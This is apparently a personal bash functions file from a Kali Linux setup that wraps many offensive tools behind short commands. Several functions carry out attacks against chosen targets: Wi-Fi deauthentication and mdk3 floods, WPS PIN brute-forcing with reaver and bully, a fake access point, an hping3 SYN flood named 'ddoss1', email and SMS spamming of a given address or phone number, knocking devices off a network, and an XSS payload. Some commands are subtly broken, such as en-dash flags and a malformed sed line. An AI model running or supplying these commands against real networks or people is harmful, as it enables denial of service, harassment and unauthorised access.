source $HOME/Desktop/menu.sh
alias sap='sudo apt install'
alias ytdl='yt-dlp -f 'ba' -x --audio-format mp3 --yes-playlist'
alias ytdl_vid='yt-dlp'
alias chmod='sudo chmod +x'
# color varibles
cyan='\e[0;36m'
lightcyan='\e[96m'
green='\e[0;32m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
# LOCAL IP VARIBLES:
ROUTER=192.168.2.1


# FUNCTIONS:
info() { printf $white"[INFO] $1\n" ; }
err() { printf $red"[ERROR] $1\n" ; }
sapache() { /etc/init.d/apache2 start ; }
airstart() { sudo airmon-ng check kill; sudo airmon-ng start wlan0 ; }
airstop() { sudo airmon-ng stop wlan0mon; sudo service NetworkManager start; sudo service NetworkManager restart ; }
portscan() { echo "enter target ip"; read IP; sudo masscan -p1-65535,U:1-65535 $IP --rate=1000 -e wlan0 ; }
airodump() { sudo airmon-ng check kill; sudo airmon-ng start wlan0; sudo airodump-ng wlan0mon ; }
deauth() { echo "enter apmac-addr stmac-addr"; read apmac stmac; sudo aireplay-ng -0 0 -a $apmac -c $stmac wlan0mon ; }

allsystem_info() {

printf $red"will include: usb devices, pci, disk/file space, kernal&drivers, failed units, logs etc.\n"
sudo systemctl --failed
sudo df 
sudo hostnamectl 
sudo free 
sudo uptime 
sudo ps -eo %mem,%cpu,comm --sort=-%mem | head -n 6 
sudo lspci 
sudo lsusb 
sudo id 


}


find_file_by_words_findfile_by_name() {

findfile() {
read -p "input filename your looking for:" file
find -name "$file"
}

begin() {
read -p "input path not a file, EX: /bin/ :" path
read -p "input word to scan for EX: emails:" word
grep -Rw $path -e $word
}

end() {
echo "okay moving onto next option"
read -p "word inside the file to find:" wtfind
read -p "path to that file:" filepath
sed -i 's/$wtfind//g' $filepath
}

printword() {
read -p "input line number in a file:" line
read -p "input path to that file:" path
sed -n $linep $path
}
findfile
begin
end
printword
}


startwebserver() {


read -p "please paste folder path to start http web server:" path
cd $path
python2 -m SimpleHTTPServer 8000
}


listallnetwork() {

sudo ifconfig 
sudo iwconfig 
sudo ip link show 
}


snet() {

xterm -e bash -c "sudo watch netstat -nutlp; bash" &
xterm -e bash -c "sudo watch arp-scan --localnet; bash" &
xterm -e bash -c "sudo wash -i wlan0; bash" &
xterm -e bash -c "sudo iw dev wlan0 scan | grep '^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA'; bash" &
xterm -e bash -c "sudo netdiscover -p -r 192.168.2.1/24; bash"
}



update() {

sudo apt update; sudo apt dist-upgrade -y; sudo apt autoremove -y; sudo apt autoclean; sudo apt clean
}

router() {
ROUTER=192.168.2.1
firefox $ROUTER
}


newmac() {


sudo ifconfig wlan0 down; sudo macchanger -r wlan0; sudo ifconfig wlan0 up
}


extip() {


curl ifconfig.me
}


scansys() { 


xterm -e bash -c "sudo lynis audit system; bash" & xterm -e bash -c "sudo chkrootkit; bash"
}


cmdloop() {


echo "enter command to loop 100x"; read cmd; for i in {1..100}; do $cmd; done
}


dict() {


echo "enter word to lookup"; read word; curl dict://dict.org/d:$word
}

nmapsearch4script() {
read -p "nmap script searcher pattern/word?:" word

ls /usr/share/nmap/scripts/* | grep $word
}

nmap_all() {
read -p "target ip to scan:" ip
sudo nmap --script all $ip
sudo nmap --script all $ip/24
nmapscan1() {
read -p "what ip do you want to scan:" ip
nmap -v -sS -A -T4 $ip;
nmap -v -sS -p–A -T4 $ip;
nmap -v -sU -sS -p- -A -T4 $ip;
nmap -v -p 445 –script=smb-check-vulns–script-args=unsafe=1 $ip
}
nmapscan1
}


wps_att() {


echo -e $green "enter (targetmac) (channel)"
read mac ch
xterm -e bash -c "sudo reaver -i wlan0mon -b $mac -c $ch -b -f -N -L -d 2 -vvroot; bash" &
xterm -e bash -c "sudo bully wlan0mon -b $mac -c $ch -S -F -B -v 3; bash" &
xterm -e bash -c "sudo reaver -i wlan0mon -b $mac -c $ch -K 1 -N -vv; bash" &
xterm -e bash -c "sudo bully wlan0mon -b $mac -d -v 3; bash" &
xterm -e bash -c "sudo reaver -i wlan0mon -b $mac -c $ch -f -N -g 1 -vv -p ''; bash"
}


ddoss1() {


read -p "targ ip:" ip
xterm -e bash -c "sudo hping3 -S -p 135 --flood $ip; bash" &
xterm -e bash -c "sudo hping3 -i u1 -S -p 80 $ip; bash" &

}

getwebip() {

#get website ip
read -p "web url to scan for ip:" weburl
echo $(wget -qO - https://$weburl)
}

fake_ap() {


read -p "set fake ap mac-addr must be a router in range:" mac
read -p "set channel number:" ch
read -p "set ap name must be one in range:" essid
sudo airbase-ng -a $mac -i wlan0 -c $ch --essid $essid wlan0
}


openwifi() {

sudo iw dev wlan0 scan
}

email_spam() {


read -p "enter target email:" targ
read -p "enter how long to send for:" time
cd /home/kali/Desktop/moduels/sms_spam && python3 impulse.py --method EMAIL --time $time --target $targ
}

sms_spam() {


read -p "enter phone number:" num
cd /home/kali/Desktop/moduels/sms_spam && python3 impulse.py --method SMS --time 200 --target $num
}


mdk3_d() {


sudo airmon-ng start wlan0
clear
read -p "full path to blacklist file containing macaddress:" blacklist
sudo mdk3 wlan0mon d -b $blacklist
}


mdk3_a() {


sudo airmon-ng start wlan0
clear
read -p "target bssid:" bssid
sudo mdk3 wlan0mon a -a $bssid
}


mdk3_m() {


sudo airmon-ng start wlan0
clear
read -p "target bssid:" bssid
sudo mdk3 wlan0mon m -t $bssid -w 1 -n 500 -j
}


mdk3_w() {


sudo airmon-ng start wlan0
clear
read -p "target ssid:" ssid 
sudo mdk3 wlan0mon w -e $ssid -z
}


mdk3_f() {


sudo airmon-ng start wlan0
clear
read -p "target bssid:" bssid
sudo mdk3 wlan0mon f -t $bssid -f c4:ac:59:08:d2:b9
}


mdk3_g() {

sudo airmon-ng start wlan0; clear
read -p "target bssid:" bssid
sudo mdk3 wlan0mon g -t $bssid
}


catmakefile() {

cat <<EOF > print.sh
#!/bin/bash

EOF
}



encrypt_decrypt() { 


echo "e = encrypt d = decrypt:" 
read e d
read -p "paste full path to file:" file
ccat -$e $file
ccat -$d $file
}

setip() {

read -p "setting new ip pick number for 192.168.2.urnumberhere:" num
sudo ifconfig wlan0 192.168.2.$num/24 
}

aiosint() {
cd /home/kali/Desktop/AIO_osint_scan/ && sudo python3 MrHolmes.py
}

kick_off_network() {

read -p "enter packets to send:" packet
cd /home/kali/Desktop/kickthemout/ && sudo python3 kickthemout.py -p $packet
}


tuning() {

#Tuning and preparations
#Changing country:
sudo iw reg get
sudo iw reg set BZ # BZ is better then BO
#Changing channel and power:
sudo iwconfig wlan1 txpower 30
sudo iwconfig wlan1 channel 13
sudo iw phy wlan1 set txpower fixed 30mBm
}

monitorscript() {
sudo airmon-ng start wlan0
sudo horst -i wlan0mon
 
}

attackwps_reaver() {

read -p "bssid of router to attack:" bssid
read -p "channel of router:" ch
#attack WPS
#Attack WPS with reaver :
sudo airmon-ng start wlan0
xterm -hold -e "sudo airodump-ng wlan0mon"
sudo wash –i wlan0mon –C
sudo reaver –i wlan0mon –b $bssid -vv –S
sudo reaver –i –c $ch -b $bssid -p -vv –S

}

tcpdump1() {
sudo arp-scan --localnet
read -p "what's host is you want to sniff:" ip
sudo tcpdump host $ip -c10 -A -n
}

diskflush() {
sudo sh -c 'sync; echo 3 > /proc/sys/vm/drop_caches'
free && sync && sudo echo 3 > /proc/sys/vm/drop_caches && free
}



smb_enumeration() {
read -p "target ip:" ip
sudo nbtscan $ip/24;
sudo enum4linux -a $ip
}

scan_local() {
xterm -hold -e "sudo arp-scan --localnet" &
sudo netdiscover -r 192.168.2.1/24 -p
}

basic_fingerprinting() {
read -p "ip to finger print" ip
sudo nc -v $ip 25;
sudo telnet $ip 25
}

ipforward() {
sudo -i && echo 1 > /proc/sys/net/ipv4/ip_forward
}
ipforwardstop() { 
sudo -i && echo 0 > /proc/sys/net/ipv4/ip_forward
}

snapchat() {

echo '
https://story.snapchat.com/s/username.
https://map.snapchat.com.
'
}


xsspayloads() {

echo '<IMG SRC="javascript:alert('XSS');">'
}

google_search_index() {
echo '
intitle:
allintitle:
inurl:
allinurl:
filetype:
allintext:
site:
link:'
}

android_phone_dialcodes() {
echo '
service menus 
*#0011# , *#197328640# ,  *#2263# , *#9090# , *#0# ,
system dump 
*#9900#
USB mode
*#0808#
firmware update
*#2663#
Galaxy apps test mode
*#88277*66#
'
}